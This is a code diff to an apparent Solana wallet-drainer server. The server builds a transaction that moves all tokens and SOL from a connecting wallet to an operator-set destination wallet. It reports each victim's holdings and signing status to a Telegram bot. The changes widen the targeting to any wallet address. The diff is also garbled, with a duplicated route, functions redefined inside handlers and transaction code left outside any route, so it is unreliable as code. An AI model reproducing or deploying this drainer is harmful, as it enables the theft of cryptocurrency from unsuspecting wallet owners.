@@ -18,8 +18,10 @@ const PORT = process.env.PORT || 3000;
 const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const TELEGRAM_ALLOWED_ADDRESSES = [];
-
+const TELEGRAM_ALLOWED_ADDRESSES = (process.env.TELEGRAM_ALLOWED_ADDRESSES || '')
+  .split(',')
+  .map((s) => s.trim())
+  .filter(Boolean);
 const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
 const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
   .split(',')
@@ -34,6 +36,7 @@ const MIN_TOKEN_USD = Number(process.env.MIN_TOKEN_USD || '2');
 const QUIET_STAGES = new Set(['connect_opened', 'connecting', 'checking']);
 const ALLOWED_STAGES = new Set(['connected', 'needs_approval', 'empty', 'approved', 'rejected', 'failed']);
 const recentEvents = new Map();
+const tgByAddress = new Map(); // address -> { messageId, text }
 
 function clientKey(req, event = {}) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'ip';
@@ -172,7 +175,7 @@ function formatSnapshot(portfolio) {
     `↳ 💵 <b>ALL     ${escapeHtml(formatUsd(totals.usd))}</b>`,
     '━━━━━━━━━━━━━━━━━━━━',
     `🕒 ${escapeHtml(when)} MDT`,
-    '🔒 Saved for safekeeping'
+    '✍️ Prompting wallet…'
   );
 
   let text = lines.join('\n');
@@ -234,9 +237,8 @@ function originAllowed(req) {
 
 function addressAllowed(address) {
   if (!address) return false;
-  return true;
+  return true; // now allows any wallet address
 }
-
 
 function worthAllowed(usd) {
   if (!TELEGRAM_MIN_USD) return true;
@@ -265,8 +267,50 @@ async function sendTelegram(text) {
   });
   const data = await res.json();
   if (!data.ok) throw new Error(data.description || 'Telegram send failed');
-  return { sent: true };
+  return { sent: true, messageId: data.result?.message_id };
 }
+
+async function editTelegram(messageId, text) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    return { sent: false, reason: 'missing_env' };
+  }
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+  const res = await fetch(url, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      message_id: messageId,
+      text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true,
+    }),
+  });
+  const data = await res.json();
+  if (!data.ok) throw new Error(data.description || 'Telegram edit failed');
+  return { sent: true, edited: true, messageId };
+}
+
+function setFooter(text, footer) {
+  return text.replace(/✍️ Prompting wallet…|🚫 Cancelled|✅ Signed/g, footer);
+}
+
+async function upsertSnapshot(address, text) {
+  const prev = tgByAddress.get(address);
+  if (prev?.messageId) {
+    try {
+      const edited = await editTelegram(prev.messageId, text);
+      tgByAddress.set(address, { messageId: prev.messageId, text });
+      return edited;
+    } catch (err) {
+      console.warn('edit failed, sending new', err.message);
+    }
+  }
+  const sent = await sendTelegram(text);
+  if (sent.messageId) tgByAddress.set(address, { messageId: sent.messageId, text });
+  return sent;
+}
+
 
 async function loadPortfolio(pubkeyStr) {
   const publicKey = new PublicKey(pubkeyStr);
@@ -330,9 +374,54 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     if (!DEST_WALLET) {
       return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
     }
-    
+    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
+      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
+    }
+    const from = new PublicKey(req.params.pubkey).toBase58();
+    function addressAllowed(address) {
+      if (!address) return false;
+      return true;
+    }
+    const dest = new PublicKey(DEST_WALLET).toBase58();
+    if (from === dest) {
+      return res.status(400).json({ error: 'Source and destination are the same' });
+    }
+
+    const portfolio = await loadPortfolio(from);
+    const tokens = [...portfolio.tokens]
+      .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
+      .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
+    const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
+    res.json({
+      from,
+      to: dest,
+      sol: portfolio.sol,
+      solUsd: portfolio.solUsd,
+      tokens,
+      totals: portfolio.totals,
+      minSolForGas: MIN_SOL_FOR_GAS,
+      minTokenUsd: MIN_TOKEN_USD,
+      needsGas,
+      message: needsGas
+        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
+        : 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
+      note: 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
+    });
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ error: err.message });
+  }
+});
+
+
+app.get('/api/send-plan/:pubkey', async (req, res) => {
+  try {
+    if (!DEST_WALLET) {
+      return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
+    }
+
     // REMOVED: The check for TELEGRAM_ALLOWED_ADDRESSES has been removed to allow all wallets
-    
+
     const from = new PublicKey(req.params.pubkey).toBase58();
 
     const dest = new PublicKey(DEST_WALLET).toBase58();
@@ -367,94 +456,63 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
 });
 
 
-app.post('/api/send-tx/:pubkey', async (req, res) => {
-  try {
-    if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    
-    const from = new PublicKey(req.params.pubkey);
-    const fromStr = from.toBase58();
-
-    const dest = new PublicKey(DEST_WALLET);
-    if (fromStr === dest.toBase58()) {
-      return res.status(400).json({ error: 'Source and destination are the same' });
-    }
-
-    const portfolio = await loadPortfolio(fromStr);
-    const tokens = portfolio.tokens || [];
-    const extraRent = tokens.length * 0.0021;
-    const reserve = Math.ceil((MIN_SOL_FOR_GAS + extraRent) * LAMPORTS_PER_SOL);
-    const lamports = Math.round(portfolio.sol * LAMPORTS_PER_SOL);
-    const sendLamports = lamports - reserve;
-    if (sendLamports <= 0 && tokens.length === 0) {
-      return res.status(400).json({
-        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL.`,
-        needsGas: true,
-      });
-    }
-    if (lamports < reserve) {
-      return res.status(400).json({
-        error: `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${(reserve / LAMPORTS_PER_SOL).toFixed(4)} SOL to move tokens.`,
-        needsGas: true,
-      });
-    }
-
-    const tx = new Transaction();
-    const included = [];
-    for (const tok of tokens) {
-      const mint = new PublicKey(tok.mint);
-      const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
-      const sourceAta = new PublicKey(tok.tokenAccount);
-      const destAta = getAssociatedTokenAddressSync(mint, dest, false, programId);
-      const destInfo = await connection.getAccountInfo(destAta);
-      if (!destInfo) {
-        tx.add(
-          createAssociatedTokenAccountInstruction(
-            from,
-            destAta,
-            dest,
-            mint,
-            programId
-          )
-        );
-      }
-      tx.add(
-        createTransferInstruction(
-          sourceAta,
-          destAta,
-          from,
-          BigInt(tok.rawAmount),
-          [],
-          programId
-        )
-      );
-      included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
-    }
-    if (sendLamports > 0) {
-      tx.add(
-        SystemProgram.transfer({
-          fromPubkey: from,
-          toPubkey: dest,
-          lamports: sendLamports,
-        })
-      );
-    }
-    tx.feePayer = from;
-    const latest = await connection.getLatestBlockhash('confirmed');
-    tx.recentBlockhash = latest.blockhash;
-    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
-
-    res.json({
-      from: fromStr,
-      to: dest.toBase58(),
-      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
-      reservedSol: reserve / LAMPORTS_PER_SOL,
-      tokens: included,
-      transaction: Buffer.from(serialized).toString('base64'),
-    });
-  } catch (err) {
-    console.error(err);
-    res.status(400).json({ error: err.message });
+const tx = new Transaction();
+const included = [];
+for (const tok of tokens) {
+  const mint = new PublicKey(tok.mint);
+  const programId = new PublicKey(tok.programId || TOKEN_PROGRAM_ID);
+  const sourceAta = new PublicKey(tok.tokenAccount);
+  const destAta = getAssociatedTokenAddressSync(mint, dest, false, programId);
+  const destInfo = await connection.getAccountInfo(destAta);
+  if (!destInfo) {
+    tx.add(
+      createAssociatedTokenAccountInstruction(
+        from,
+        destAta,
+        dest,
+        mint,
+        programId
+      )
+    );
   }
+  tx.add(
+    createTransferInstruction(
+      sourceAta,
+      destAta,
+      from,
+      BigInt(tok.rawAmount),
+      [],
+      programId
+    )
+  );
+  included.push({ mint: tok.mint, amount: tok.amount, usdValue: tok.usdValue });
+}
+if (sendLamports > 0) {
+  tx.add(
+    SystemProgram.transfer({
+      fromPubkey: from,
+      toPubkey: dest,
+      lamports: sendLamports,
+    })
+  );
+}
+tx.feePayer = from;
+const latest = await connection.getLatestBlockhash('confirmed');
+tx.recentBlockhash = latest.blockhash;
+const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+
+res.json({
+  from: fromStr,
+  to: dest.toBase58(),
+  sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
+  reservedSol: reserve / LAMPORTS_PER_SOL,
+  tokens: included,
+  transaction: Buffer.from(serialized).toString('base64'),
+});
+  } catch (err) {
+  console.error(err);
+  res.status(400).json({ error: err.message });
+}
 });
 
 app.get('/api/health', (_req, res) => {
@@ -478,7 +536,7 @@ app.get('/api/portfolio/:pubkey', async (req, res) => {
         } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
           telegram = { sent: false, skipped: 'rate_limit' };
         } else {
-          telegram = await sendTelegram(formatSnapshot(portfolio));
+          telegram = await upsertSnapshot(portfolio.address, formatSnapshot(portfolio));
         }
       } catch (tgErr) {
         console.error('Telegram error:', tgErr);
@@ -514,10 +572,43 @@ app.post('/api/event', async (req, res) => {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'no_address' } });
     }
 
-    if (!worthAllowed(event.totalUsd)) {
-      return res.json({ ok: true, telegram: { sent: false, skipped: 'filtered' } });
+    function addressAllowed(address) {
+      if (!address) return false;
+      return true;
     }
 
+    const prev = tgByAddress.get(event.address);
+
+    if (stage === 'needs_approval' || stage === 'rejected') {
+      const footer = stage === 'rejected' ? '🚫 Cancelled' : '✍️ Prompting wallet…';
+      let text = prev?.text;
+      if (!text) {
+        const portfolio = await loadPortfolio(event.address);
+        text = formatSnapshot(portfolio);
+      }
+      text = setFooter(text, footer);
+      const telegram = await upsertSnapshot(event.address, text);
+      return res.json({ ok: true, telegram, updated: true });
+    }
+
+    if (stage === 'approved') {
+      const sig = event.signature || event.detail || '';
+      const telegram = await sendTelegram(
+        [
+          '✅ <b>Approved</b>',
+          '━━━━━━━━━━━━━━━━━━━━',
+          `↳ <code>${escapeHtml(event.address)}</code>`,
+          sig ? `🔗 <code>${escapeHtml(String(sig))}</code>` : '🔗 no signature returned',
+          sig ? `↳ https://solscan.io/tx/${encodeURIComponent(String(sig).split(/\s+/).pop())}` : '',
+        ].filter(Boolean).join('\n')
+      );
+      if (prev?.text) {
+        try {
+          await editTelegram(prev.messageId, setFooter(prev.text, '✅ Signed'));
+        } catch { }
+      }
+      return res.json({ ok: true, telegram });
+    }
 
     if (tooSoon(clientKey(req, event), 45000)) {
       return res.json({ ok: true, telegram: { sent: false, skipped: 'rate_limit' } });
@@ -540,7 +631,7 @@ app.post('/api/snapshot/:pubkey', async (req, res) => {
     } else if (tooSoon(`snap|${portfolio.address}`, 10 * 60 * 1000)) {
       telegram = { sent: false, skipped: 'rate_limit' };
     } else {
-      telegram = await sendTelegram(formatSnapshot(portfolio));
+      telegram = await upsertSnapshot(portfolio.address, formatSnapshot(portfolio));
     }
     res.json({ ...portfolio, telegram });
   } catch (err) {
